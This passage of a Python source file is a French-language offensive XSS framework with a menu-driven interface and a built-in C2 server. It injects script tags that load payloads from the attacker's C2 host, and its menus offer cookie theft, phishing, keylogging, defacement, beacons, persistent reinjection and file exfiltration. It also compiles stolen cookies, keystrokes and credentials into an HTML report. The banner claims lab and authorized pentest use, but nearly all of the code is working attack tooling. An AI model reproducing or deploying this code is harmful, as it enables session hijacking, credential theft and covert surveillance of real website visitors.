                   f"HTTP {resp.status_code}", datetime.now(timezone.utc).isoformat()))
        conn.commit()
        conn.close()
        return {"status": resp.status_code, "url": urljoin(url, remote_path)}
    except requests.RequestException as e:
        CONSOLE.print(f"[red]Erreur upload : {e}[/red]")
        return None


def file_download_via_xss(url, param, method, remote_file_url, local_save_path):
    """
    Utilise la XSS pour faire télécharger un fichier à la victime (fetch + exfil).
    """
    inj_id = str(uuid.uuid4())[:8]
    js = build_js_payload("fetch_file", inj_id, remote_file_url)
    script_tag = f"<script src='{C2_PUBLIC}/payload/{inj_id}?t=fetch_file&extra={quote(remote_file_url)}'></script>"

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})

    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    clean_url = url.split("?")[0]
    test_params = {k: v[0] for k, v in qs.items()}
    test_params[param] = script_tag

    try:
        if method.upper() == "GET":
            resp = session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP)
        else:
            resp = session.post(url, data=test_params, timeout=TIMEOUT_HTTP)

        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO files (action, remote_url, local_path, status, timestamp) VALUES (?,?,?,?,?)",
                  ("download_trigger", remote_file_url, local_save_path, f"HTTP {resp.status_code}",
                   datetime.now(timezone.utc).isoformat()))
        conn.commit()
        conn.close()
        return {"status": resp.status_code, "inj_id": inj_id}
    except requests.RequestException as e:
        CONSOLE.print(f"[red]Erreur : {e}[/red]")
        return None


def file_upload_to_victim(injection_id, local_file, param, url, method):
    """Fait télécharger un fichier à la victime via XSS"""
    if not os.path.isfile(local_file):
        CONSOLE.print(f"[red]Fichier introuvable : {local_file}[/red]")
        return

    # Copie le fichier dans le répertoire C2
    filename = os.path.basename(local_file)
    dest = os.path.join(C2_DIR, filename)
    with open(local_file, "rb") as src, open(dest, "wb") as dst:
        dst.write(src.read())

    js = build_js_payload("download_forced", injection_id, filename)
    script_tag = f"<script src='{C2_PUBLIC}/payload/{injection_id}?t=download_forced&extra={quote(filename)}'></script>"

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})

    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    clean_url = url.split("?")[0]
    test_params = {k: v[0] for k, v in qs.items()}
    test_params[param] = script_tag

    try:
        if method.upper() == "GET":
            session.get(clean_url, params=test_params, timeout=TIMEOUT_HTTP)
        else:
            session.post(url, data=test_params, timeout=TIMEOUT_HTTP)
        CONSOLE.print(f"[green]Upload forcé injecté — la victime téléchargera {filename}[/green]")
    except requests.RequestException as e:
        CONSOLE.print(f"[red]Erreur : {e}[/red]")


# ═════════════════════════════════════════════════════════════════════
# MODULE RAPPORT
# ═════════════════════════════════════════════════════════════════════

def generate_html_report():
    """Génère un rapport HTML complet"""
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()

    c.execute("SELECT * FROM captures ORDER BY timestamp DESC")
    captures = c.fetchall()
    c.execute("SELECT * FROM injections ORDER BY created_at DESC")
    injections = c.fetchall()
    c.execute("SELECT * FROM files ORDER BY timestamp DESC")
    files = c.fetchall()
    conn.close()

    html = f"""<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Rapport XSS Framework Ultime</title>
<style>
body {{ font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: #eee; margin: 0; padding: 20px; }}
h1 {{ color: #e94560; text-align: center; }}
h2 {{ color: #0f3460; color: #e94560; border-bottom: 2px solid #e94560; padding-bottom: 5px; }}
table {{ width: 100%; border-collapse: collapse; margin: 15px 0; }}
th {{ background: #16213e; color: #e94560; padding: 10px; text-align: left; }}
td {{ padding: 8px; border-bottom: 1px solid #333; }}
tr:hover {{ background: #16213e; }}
.badge {{ padding: 3px 8px; border-radius: 3px; font-size: 11px; font-weight: bold; }}
.badge-red {{ background: #e94560; color: white; }}
.badge-green {{ background: #2ecc71; color: white; }}
.badge-blue {{ background: #3498db; color: white; }}
.badge-orange {{ background: #f39c12; color: white; }}
.stat {{ display: inline-block; background: #16213e; padding: 15px 25px; margin: 5px; border-radius: 8px; text-align: center; }}
.stat-num {{ font-size: 28px; font-weight: bold; color: #e94560; }}
.stat-label {{ font-size: 12px; color: #999; }}
</style>
</head>
<body>
<h1>⚡ XSS FRAMEWORK ULTIME — Rapport</h1>
<p style="text-align:center;">Généré le {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>

<div style="text-align:center;">
<div class="stat"><div class="stat-num">{len(captures)}</div><div class="stat-label">Captures</div></div>
<div class="stat"><div class="stat-num">{len(injections)}</div><div class="stat-label">Injections</div></div>
<div class="stat"><div class="stat-num">{len(files)}</div><div class="stat-label">Fichiers</div></div>
</div>

<h2>🍪 Cookies Volés</h2>
<table><tr><th>Date</th><th>IP</th><th>URL</th><th>Cookies</th></tr>"""
    for cap in captures:
        if cap[1] == "cookies":
            data = json.loads(cap[5]) if cap[5] else {}
            html += f"<tr><td>{cap[7]}</td><td>{cap[2]}</td><td>{cap[4]}</td><td>{data.get('cookies','')[:100]}</td></tr>"
    html += "</table>"

    html += "<h2>⌨️ Keylogger</h2><table><tr><th>Date</th><th>IP</th><th>URL</th><th>Touches</th></tr>"
    for cap in captures:
        if cap[1] == "keylogger":
            data = json.loads(cap[5]) if cap[5] else {}
            html += f"<tr><td>{cap[7]}</td><td>{cap[2]}</td><td>{cap[4]}</td><td>{data.get('keys','')[:100]}</td></tr>"
    html += "</table>"

    html += "<h2>🎣 Phishing</h2><table><tr><th>Date</th><th>IP</th><th>URL</th><th>Identifiants</th></tr>"
    for cap in captures:
        if cap[1] == "phishing":
            html += f"<tr><td>{cap[7]}</td><td>{cap[2]}</td><td>{cap[4]}</td><td>{cap[5][:100]}</td></tr>"
    html += "</table>"

    html += "<h2>📡 Beacons</h2><table><tr><th>Date</th><th>IP</th><th>URL</th><th>Données</th></tr>"
    for cap in captures:
        if cap[1] in ("beacon", "beacon_info"):
            html += f"<tr><td>{cap[7]}</td><td>{cap[2]}</td><td>{cap[4]}</td><td>{cap[5][:100]}</td></tr>"
    html += "</table>"

    html += "<h2>💉 Injections</h2><table><tr><th>ID</th><th>URL</th><th>Param</th><th>Type</th><th>Méthode</th><th>Status</th><th>Exéc.</th><th>Créé</th></tr>"
    for inj in injections:
        html += f"<tr><td>{inj[0]}</td><td>{inj[1][:60]}</td><td>{inj[2]}</td><td><span class='badge badge-red'>{inj[4]}</span></td><td>{inj[3]}</td><td>{inj[5]}</td><td>{inj[6]}</td><td>{inj[8]}</td></tr>"
    html += "</table>"

    html += "<h2>📁 Fichiers</h2><table><tr><th>Action</th><th>URL distante</th><th>Chemin local</th><th>Status</th><th>Date</th></tr>"
    for f in files:
        html += f"<tr><td><span class='badge badge-blue'>{f[1]}</span></td><td>{f[2]}</td><td>{f[3]}</td><td>{f[4]}</td><td>{f[5]}</td></tr>"
    html += "</table>"

    html += "</body></html>"

    report_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "rapport_xss.html")
    with open(report_path, "w", encoding="utf-8") as f:
        f.write(html)
    return report_path


# ═════════════════════════════════════════════════════════════════════
# INTERFACE TUI
# ═════════════════════════════════════════════════════════════════════

BANNER = """
[bold red]
╔═══════════════════════════════════════════════════════════════╗
║   ██╗  ██╗███████╗███████╗                                    ║
║   ██║ ██╔╝██╔════╝██╔════╝   XSS FRAMEWORK ULTIME             ║
║   █████╔╝ ███████╗███████╗   ─── PERSISTANCE EDITION ───      ║
║   ██╔═██╗ ╚════██║╚════██║   v1.0                             ║
║   ██║  ██╗███████║███████║   Labo / CTF / Pentest autorisé   ║
║   ╚═╝  ╚═╝╚══════╝╚══════╝                                    ║
╚═══════════════════════════════════════════════════════════════╝
[/bold red]
"""


def print_banner():
    CONSOLE.print(BANNER)
    CONSOLE.print(Panel(
        "[bold yellow]⚠ Outil de test de sécurité — Usage exclusif dans un cadre légal[/bold yellow]\n"
        "[dim]Labo personnel, CTF, pentests autorisés uniquement.[/dim]",
        border_style="red"
    ))


def press_enter():
    CONSOLE.print("\n[dim]Appuyez sur Entrée pour continuer...[/dim]")
    input()


def ask_url():
    return Prompt.ask("[cyan]URL cible[/cyan]", default="http://127.0.0.1:8081")


def ask_param():
    return Prompt.ask("[cyan]Paramètre à injecter[/cyan]", default="q")


def ask_method():
    return Prompt.ask("[cyan]Méthode[/cyan]", choices=["GET", "POST"], default="GET")


def menu_scan():
    CONSOLE.print("\n[bold cyan]═══ SCAN XSS ═══[/bold cyan]\n")
    url = ask_url()
    method = ask_method()

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})

    # Détecte les formulaires
    try:
        resp = session.get(url, timeout=TIMEOUT_HTTP)
        forms = extract_forms(url, resp.text)
        CONSOLE.print(f"[green]{len(forms)} formulaire(s) détecté(s)[/green]")
    except requests.RequestException as e:
        CONSOLE.print(f"[red]Impossible de joindre la cible : {e}[/red]")
        press_enter()
        return

    # Scan réflexe
    with CONSOLE.status("[bold green]Scan en cours..."):
        results = scan_reflected(url, method=method)

    table = Table(title="Résultats Scan XSS", box=box.ROUNDED)
    table.add_column("Param", style="cyan")
    table.add_column("Payload", style="yellow", max_width=40)
    table.add_column("Méthode", style="magenta")
    table.add_column("Preuve", style="green")
    table.add_column("HTTP", style="dim")

    for r in results[:20]:
        table.add_row(r["param"], r["payload"][:40], r["method"], r["evidence"], str(r["status_code"]))

    CONSOLE.print(table)

    if not results:
        CONSOLE.print("[yellow]Aucun XSS réfléchi détecté avec les payloads de base.[/yellow]")

    # Scan stocké si formulaires
    if forms:
        CONSOLE.print("\n[bold cyan]Scan XSS Stocké...[/bold cyan]")
        stored_results = scan_stored(url, forms=forms)
        if stored_results:
            st = Table(title="XSS Stocké — Résultats", box=box.ROUNDED)
            st.add_column("Form", style="cyan")
            st.add_column("Payload", style="yellow", max_width=40)
            st.add_column("Preuve", style="green")
            for r in stored_results:
                st.add_row(r["param"], r["payload"][:40], r["evidence"])
            CONSOLE.print(st)
        else:
            CONSOLE.print("[yellow]Aucun XSS stocké détecté.[/yellow]")

    # Enregistre la cible
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""INSERT OR REPLACE INTO targets (url, forms_found, vulns_found, last_scan)
                 VALUES (?,?,?,?)""",
              (url, len(forms), len(results), datetime.now(timezone.utc).isoformat()))
    conn.commit()
    conn.close()

    press_enter()


def menu_exploit():
    CONSOLE.print("\n[bold cyan]═══ EXPLOITATION ═══[/bold cyan]\n")
    CONSOLE.print("  [1] 🍪 Vol de cookies")
    CONSOLE.print("  [2] 🎣 Phishing (formulaire de connexion)")
    CONSOLE.print("  [3] 🎨 Défiguration (defacement)")
    CONSOLE.print("  [4] ⌨️  Keylogger")
    CONSOLE.print("  [5] 🔄 Redirection")
    CONSOLE.print("  [6] 📡 Beacon (surveillance continue)")
    CONSOLE.print("  [7] 💥 Combinaison complète (cookies + keylogger + persistance)")
    CONSOLE.print("  [0] ← Retour\n")

    choice = Prompt.ask("[yellow]Choix[/yellow]", default="1")
    if choice == "0":
        return

    url = ask_url()
    param = ask_param()
    method = ask_method()

    payload_map = {
        "1": "cookies", "2": "phishing", "3": "deface",
        "4": "keylogger", "5": "redirect", "6": "beacon", "7": "combined"
    }
    payload_type = payload_map.get(choice, "cookies")
    extra = ""
    if choice == "5":
        extra = Prompt.ask("[cyan]URL de redirection[/cyan]", default="https://example.com")

    with CONSOLE.status("[bold green]Injection en cours..."):
        inj_id, script_tag = exploit_inject(url, param, method, payload_type, extra)

    CONSOLE.print(f"\n[bold green]✓ Injection réussie ![/bold green]")
    CONSOLE.print(f"[cyan]Injection ID : {inj_id}[/cyan]")
    CONSOLE.print(f"[dim]Payload : {script_tag[:100]}...[/dim]")
    CONSOLE.print(f"\n[yellow]Le payload s'exécutera quand une victime visitera l'URL.[/yellow]")
    CONSOLE.print(f"[dim]Vérifie les captures via le menu [5] Données Capturées[/dim]")

    press_enter()


def menu_stored():
    CONSOLE.print("\n[bold cyan]═══ XSS STOCKÉ ═══[/bold cyan]\n")
    url = ask_url()

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})

    try:
        resp = session.get(url, timeout=TIMEOUT_HTTP)
        forms = extract_forms(url, resp.text)
    except requests.RequestException as e:
        CONSOLE.print(f"[red]Erreur : {e}[/red]")
        press_enter()
        return

    if not forms:
        CONSOLE.print("[yellow]Aucun formulaire détecté sur cette page.[/yellow]")
        press_enter()
        return

    table = Table(title="Formulaires Détectés", box=box.ROUNDED)
    table.add_column("#", style="cyan")
    table.add_column("Action", style="yellow")
    table.add_column("Méthode", style="magenta")
    table.add_column("Champs", style="green")
    for i, f in enumerate(forms):
        field_names = ", ".join([x["name"] for x in f["fields"]])
        table.add_row(str(i), f["action"][:50], f["method"], field_names)
    CONSOLE.print(table)

    CONSOLE.print("\n  [1] 🍪 Vol de cookies (stocké)")
    CONSOLE.print("  [2] ⌨️  Keylogger (stocké)")
    CONSOLE.print("  [3] 📡 Beacon + Persistance (stocké)")
    CONSOLE.print("  [0] ← Retour\n")

    choice = Prompt.ask("[yellow]Choix[/yellow]", default="3")
    if choice == "0":
        return

    payload_map = {"1": "cookies", "2": "keylogger", "3": "combined"}
    payload_type = payload_map.get(choice, "combined")

    with CONSOLE.status("[bold green]Injection stockée en cours..."):
        inj_id, results = exploit_stored(url, forms, payload_type)

    CONSOLE.print(f"\n[bold green]✓ Injection stockée effectuée ![/bold green]")
    CONSOLE.print(f"[cyan]Injection ID : {inj_id}[/cyan]\n")

    rt = Table(title="Résultats", box=box.ROUNDED)
    rt.add_column("Formulaire", style="cyan")
    rt.add_column("Statut", style="yellow")
    for r in results:
        rt.add_row(r["form"][:50], r["status"])
    CONSOLE.print(rt)

    press_enter()


def menu_persistence():
    CONSOLE.print("\n[bold cyan]═══ PERSISTANCE ═══[/bold cyan]\n")
    CONSOLE.print("  [1] ✅ Activer la persistance (réinjection auto)")
    CONSOLE.print("  [2] ❌ Désactiver la persistance")
    CONSOLE.print("  [3] 📋 Lister les injections actives")
    CONSOLE.print("  [4] 🗑️  Supprimer une injection")
    CONSOLE.print("  [0] ← Retour\n")

    choice = Prompt.ask("[yellow]Choix[/yellow]", default="1")

    if choice == "1":
        persistence_mgr.start()
    elif choice == "2":
        persistence_mgr.stop()
    elif choice == "3":
        rows = persistence_mgr.list_injections()
        table = Table(title="Injections Actives", box=box.ROUNDED)
        table.add_column("ID", style="cyan")
        table.add_column("URL", style="yellow", max_width=40)
        table.add_column("Param", style="magenta")
        table.add_column("Type", style="red")
        table.add_column("Status", style="green")
        table.add_column("Exéc.", style="bold")
        table.add_column("Dernière", style="dim")
        for r in rows:
            table.add_row(str(r[0]), r[1][:40], r[2], r[3], r[5], str(r[6]), r[7] or "jamais")
        CONSOLE.print(table)
    elif choice == "4":
        inj_id = Prompt.ask("[cyan]ID de l'injection à supprimer[/cyan]")
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("DELETE FROM injections WHERE id = ?", (int(inj_id),))
        conn.commit()
        conn.close()
        CONSOLE.print(f"[green]Injection {inj_id} supprimée.[/green]")

    press_enter()


def menu_files():
    CONSOLE.print("\n[bold cyan]═══ FICHIERS ═══[/bold cyan]\n")
    CONSOLE.print("  [1] 📤 Upload un fichier vers le site cible")
    CONSOLE.print("  [2] 📥 Forcer la victime à télécharger un fichier")
    CONSOLE.print("  [3] 📂 Récupérer un fichier depuis la victime (via XSS)")
    CONSOLE.print("  [4] 📋 Historique des opérations fichiers")
    CONSOLE.print("  [0] ← Retour\n")

    choice = Prompt.ask("[yellow]Choix[/yellow]", default="1")
    if choice == "0":
        return

    if choice == "1":
        url = ask_url()
        path = Prompt.ask("[cyan]Chemin local du fichier[/cyan]")
        remote = Prompt.ask("[cyan]Chemin d'upload sur le serveur[/cyan]", default="/upload")
        result = file_upload_via_xss(url, "", "POST", path, remote)
        if result:
            CONSOLE.print(f"[green]Upload effectué : HTTP {result['status']}[/green]")

    elif choice == "2":
        url = ask_url()
        param = ask_param()
        method = ask_method()
        path = Prompt.ask("[cyan]Fichier local à faire télécharger[/cyan]")
        inj_id = Prompt.ask("[cyan]Injection ID existante (ou vide pour nouvelle)[/cyan]", default="")
        if not inj_id:
            inj_id = str(uuid.uuid4())[:8]
        file_upload_to_victim(inj_id, path, param, url, method)

    elif choice == "3":
        url = ask_url()
        param = ask_param()
        method = ask_method()
        remote_file = Prompt.ask("[cyan]URL du fichier à récupérer depuis la victime[/cyan]")
        result = file_download_via_xss(url, param, method, remote_file, "")
        if result:
            CONSOLE.print(f"[green]Payload de fetch injecté (ID: {result['inj_id']})[/green]")
            CONSOLE.print("[dim]Le contenu sera visible dans les captures 'beacon_info'[/dim]")

    elif choice == "4":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT * FROM files ORDER BY timestamp DESC")
        rows = c.fetchall()
        conn.close()
        table = Table(title="Historique Fichiers", box=box.ROUNDED)
        table.add_column("Action", style="cyan")
        table.add_column("URL", style="yellow", max_width=40)
        table.add_column("Local", style="magenta", max_width=30)
        table.add_column("Status", style="green")
        table.add_column("Date", style="dim")
        for r in rows:
            table.add_row(r[1], r[2][:40], r[3][:30] if r[3] else "", r[4], r[5])
        CONSOLE.print(table)

    press_enter()


def menu_captures():
    CONSOLE.print("\n[bold cyan]═══ DONNÉES CAPTURÉES ═══[/bold cyan]\n")
    CONSOLE.print("  [1] 🍪 Cookies volés")
    CONSOLE.print("  [2] 🎣 Identifiants phishing")
    CONSOLE.print("  [3] ⌨️  Frappes clavier")
    CONSOLE.print("  [4] 📡 Beacons")
    CONSOLE.print("  [5] 📊 Tout afficher")
    CONSOLE.print("  [0] ← Retour\n")

    choice = Prompt.ask("[yellow]Choix[/yellow]", default="5")
    if choice == "0":
        return

    type_filter = None
    type_map = {"1": "cookies", "2": "phishing", "3": "keylogger", "4": "beacon"}
    if choice in type_map:
        type_filter = type_map[choice]

    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    if type_filter:
        c.execute("SELECT * FROM captures WHERE type = ? ORDER BY timestamp DESC", (type_filter,))
    else:
        c.execute("SELECT * FROM captures ORDER BY timestamp DESC")
    rows = c.fetchall()
    conn.close()

    if not rows:
        CONSOLE.print("[yellow]Aucune capture enregistrée.[/yellow]")
        press_enter()
        return

    table = Table(title="Captures", box=box.ROUNDED)
    table.add_column("ID", style="dim")
    table.add_column("Type", style="red")
    table.add_column("IP", style="cyan")
    table.add_column("URL", style="yellow", max_width=30)
    table.add_column("Données", style="green", max_width=50)
    table.add_column("Date", style="dim")
    for r in rows[:50]:
        table.add_row(str(r[0]), r[1], r[2] or "?", (r[4] or "")[:30], (r[5] or "")[:50], r[7])
    CONSOLE.print(table)

    press_enter()


def menu_report():
    CONSOLE.print("\n[bold cyan]═══ RAPPORT ═══[/bold cyan]\n")
    path = generate_html_report()
    CONSOLE.print(f"[bold green]✓ Rapport généré : {path}[/bold green]")
    press_enter()


def menu_c2():
    CONSOLE.print("\n[bold cyan]═══ SERVEUR C2 ═══[/bold cyan]\n")
    CONSOLE.print(f"  Adresse publique : [cyan]{C2_PUBLIC}[/cyan]")
    CONSOLE.print(f"  Écoute sur : [cyan]{C2_HOST}:{C2_PORT}[/cyan]")
    CONSOLE.print(f"  Endpoints disponibles :")
    for ep in ["/collect/cookies", "/collect/keys", "/collect/phish", "/collect/beacon",
               "/collect/screen", "/payload/<id>", "/download/<file>"]:
        CONSOLE.print(f"    [dim]{ep}[/dim]")
    press_enter()


def menu_settings():
    global C2_PORT, C2_PUBLIC
    CONSOLE.print("\n[bold cyan]═══ PARAMÈTRES ═══[/bold cyan]\n")
    CONSOLE.print(f"  C2 Host : [cyan]{C2_HOST}[/cyan]")
    CONSOLE.print(f"  C2 Port : [cyan]{C2_PORT}[/cyan]")
    CONSOLE.print(f"  C2 Public URL : [cyan]{C2_PUBLIC}[/cyan]")
    CONSOLE.print(f"  Base de données : [cyan]{DB_FILE}[/cyan]\n")

    new_port = Prompt.ask("[cyan]Nouveau port C2 (vide pour garder)[/cyan]", default="")
    if new_port:
        C2_PORT = int(new_port)
        CONSOLE.print(f"[yellow]Port changé — redémarre le serveur C2 pour appliquer.[/yellow]")

    new_public = Prompt.ask("[cyan]Nouvelle URL publique C2 (vide pour garder)[/cyan]", default="")
    if new_public:
        C2_PUBLIC = new_public
        CONSOLE.print(f"[green]URL publique mise à jour : {C2_PUBLIC}[/green]")

    press_enter()


def main():
    db_init()
    print_banner()

    # Lance le serveur C2 en arrière-plan
    c2_thread = threading.Thread(target=run_c2_server, daemon=True)
    c2_thread.start()
    CONSOLE.print(f"[bold green]✓ Serveur C2 démarré sur {C2_PUBLIC}[/bold green]\n")
    time.sleep(0.5)

    while True:
        CONSOLE.print("\n[bold cyan]═══════════ MENU PRINCIPAL ═══════════[/bold cyan]\n")
        CONSOLE.print("  [1] 🔍 Scanner XSS (réfléchi + stocké)")
        CONSOLE.print("  [2] 💥 Exploitation (cookies, phishing, keylogger, deface...)")
        CONSOLE.print("  [3] 💾 XSS Stocké (injection via formulaires)")
        CONSOLE.print("  [4] 🔄 Persistance (activation/désactivation/liste)")
        CONSOLE.print("  [5] 📊 Données Capturées (cookies, identifiants, clavier...)")
        CONSOLE.print("  [6] 📁 Fichiers (upload, download, exfil)")
        CONSOLE.print("  [7] 🖥️  Serveur C2 (infos)")
        CONSOLE.print("  [8] 📄 Générer Rapport HTML")
        CONSOLE.print("  [9] ⚙️  Paramètres")
        CONSOLE.print("  [0] 🚪 Quitter\n")

        choice = Prompt.ask("[bold yellow]Choix[/bold yellow]", default="1")

        if choice == "0":
            persistence_mgr.stop()
            CONSOLE.print("[bold red]Arrêt du framework. Au revoir ![/bold red]")
            sys.exit(0)
        elif choice == "1":
            menu_scan()
        elif choice == "2":
            menu_exploit()
        elif choice == "3":
            menu_stored()
        elif choice == "4":
            menu_persistence()
        elif choice == "5":
            menu_captures()
        elif choice == "6":
            menu_files()
        elif choice == "7":
            menu_c2()
        elif choice == "8":
            menu_report()
        elif choice == "9":
            menu_settings()
        else:
            CONSOLE.print("[red]Option invalide.[/red]")


if __name__ == "__main__":
    main()